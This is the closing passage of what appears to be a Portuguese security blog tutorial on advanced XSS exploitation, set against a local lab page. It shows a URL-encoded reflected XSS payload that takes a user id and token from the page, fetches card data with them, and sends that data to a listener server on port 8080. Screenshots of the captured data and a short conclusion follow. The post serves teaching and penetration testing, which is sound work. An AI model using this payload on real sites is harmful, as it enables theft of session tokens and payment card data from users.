Name%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/21/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/21/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurado para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-59.png" alt="Python server" /></p><p>Ao carregar a página, a informação sensível é carregada.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-70.png" alt="Resultado" /></p><p>Logo em seguida, os dados são encaminhados para o <em>Python server</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-71.png" alt="Resultado" /></p><h4 id="referências-20">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML</a></ul><h2 id="conclusão">Conclusão</h2><p>Esta ideia surgiu de vivência com várias pessoas e de alguns pontos onde realmente percebi que o que faltava não era conhecimento, mas sim o <em>mindset</em>, a malícia e a escolha de usar o XSS como vulnerabilidade para passar isso foi uma mera casualidade. O principal é o “<span style="color: #1cce43">fora da caixa</span>”.</p><p>Enfim, estes foram meus 10 centavos da vez, resultado de experiência prática, erros e acertos, treinamentos e mais um tanto de bagagem.</p><p>Acredito ter expressado o que gostaria com este conteúdo, de somar na qualidade de ataques e no <em>mindset</em> de um teste.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/xss/'>XSS</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a> <a href="/tags/js/" class="post-tag no-text-decoration" >JS</a> <a href="/tags/javascript/" class="post-tag no-text-decoration" >JavaScript</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Beyond the alert() - H41stur&url=https://h41stur.github.io/posts/beyond-the-alert/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Beyond the alert() - H41stur&u=https://h41stur.github.io/posts/beyond-the-alert/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Beyond the alert() - H41stur&url=https://h41stur.github.io/posts/beyond-the-alert/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/beyond-the-alert/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm-internal-writeup/"><div class="card-body"> <span class="timeago small" >Sep 7, 2021<i class="unloaded">2021-09-07T23:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM Internal Writeup</h3><div class="text-muted small"><p> Nome Internal OS Linux Nível Hard RECON Na descrição do projeto, temos as instruções para adicionar internal....</p></div></div></a></div><div class="card"> <a href="/posts/bypass-net-amsi/"><div class="card-body"> <span class="timeago small" >Mar 6, 2023<i class="unloaded">2023-03-06T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypass de processos específicos de AMSI</h3><div class="text-muted small"><p> Introdução Bypass de AMSI no Powershell Diferença entre Bypass do AMSI do PowerShell e Processos Específicos do AMSI Introdução AMSI (Antimalware Scan Interface) é uma interface de prog...</p></div></div></a></div><div class="card"> <a href="/posts/bypass-flutter-ssl/"><div class="card-body"> <span class="timeago small" >Jan 16, 2024<i class="unloaded">2024-01-16T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Flutter SSL Pinning Bypass</h3><div class="text-muted small"><p> TL-DR Os apps criados utilizando o framework Flutter processam as conexões seguras e obedecem às definições de proxy de forma distinta se comparados aos apps programados em DEX. Uma biblioteca d...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/bypass-net-amsi/" class="btn btn-outline-primary" prompt="Older"><p>Bypass de processos específicos de AMSI</p></a> <a href="/posts/bypass-flutter-ssl/" class="btn btn-outline-primary" prompt="Newer"><p>Flutter SSL Pinning Bypass</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
